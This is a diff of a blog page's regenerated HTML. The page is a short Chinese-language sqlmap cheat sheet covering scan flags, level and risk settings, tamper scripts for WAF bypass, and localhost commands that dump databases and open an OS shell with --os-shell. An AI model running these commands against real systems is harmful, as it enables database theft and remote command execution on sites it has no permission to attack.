@@ -51,8 +51,7 @@ if (!doNotTrack) {
 <div id="content"><div class="date"> 
         <time datetime="2019-08-20 12:51:25 &#43;0800 CST">Tue, 2019 Aug 20</time>
     </div> 
-    <h2 id="掃描指令">掃描指令</h2>
-
+    <h2 id="heading">掃描指令</h2>
 <ul>
 <li><code>--output-dir=</code>: 輸出位置</li>
 <li><code>-u url</code></li>
@@ -61,50 +60,31 @@ if (!doNotTrack) {
 <li><code>--data &quot;title=a&amp;content=b&quot;</code>: 可以使用<code>*</code>符號來自定注入點，如<code>title=*</code></li>
 <li><code>--user-agent=</code></li>
 </ul>
-
 <p>提昇風險注入</p>
-
-<pre><code class="language-plaintext">--level=3 --risk=3
-</code></pre>
-
-<p>設定cookie</p>
-
-<pre><code class="language-plaintext">--cookie='PHPSESSID=XXXX'
-</code></pre>
-
-<p>指定DBMS</p>
-
-<pre><code class="language-plaintext">--dbms MySQL
-</code></pre>
-
-<h2 id="tamper">tamper</h2>
-
-<p>編寫tamper並且放到<code>sqlmap/tamper/</code>。透過參數<code>--tamper tamper.py</code>啟用tamper，可以針對不同waf進行改變，例如<code>Content-Type</code>使用不同編碼繞過waf。</p>
-
-<h3 id="備註">備註</h3>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--level=3 --risk=3
+</code></pre></div><p>設定cookie</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--cookie=&#39;PHPSESSID=XXXX&#39;
+</code></pre></div><p>指定DBMS</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--dbms MySQL
+</code></pre></div><h2 id="tamper">tamper</h2>
+<p>編寫tamper並且放到<code>sqlmap/tamper/</code>。
+透過參數<code>--tamper tamper.py</code>啟用tamper，可以針對
+不同waf進行改變，例如<code>Content-Type</code>使用不同編碼繞過waf。</p>
+<h3 id="heading1">備註</h3>
 <ul>
 <li>若tamper本身會編碼，可能要<code>--skip-urlencode</code></li>
 </ul>
-
-<h3 id="參見">參見</h3>
-
+<h3 id="heading2">參見</h3>
 <ul>
 <li><a href="https://payloads.online/archivers/2017-06-08/1#0x01-tamper%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8">如何编写Sqlmap的Tamper脚本?</a></li>
 <li><a href="https://github.com/sqlmapproject/sqlmap/tree/master/tamper">sqlmap/tamper/ github</a></li>
 </ul>
-
-<h2 id="利用">利用</h2>
-
+<h2 id="heading3">利用</h2>
 <p>獲取資料表</p>
-
-<pre><code class="language-bash">sqlmap -u 'https://localhost/sql-inj.php?inj=1' -dbs
-</code></pre>
-
-<p>值入後門</p>
-
-<pre><code class="language-bash">sqlmap -u 'https://localhost/sql-inj.php?inj=1' --os-shell
-</code></pre>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> -dbs
+</code></pre></div><p>值入後門</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> --os-shell
+</code></pre></div>
 
     
       <hr>
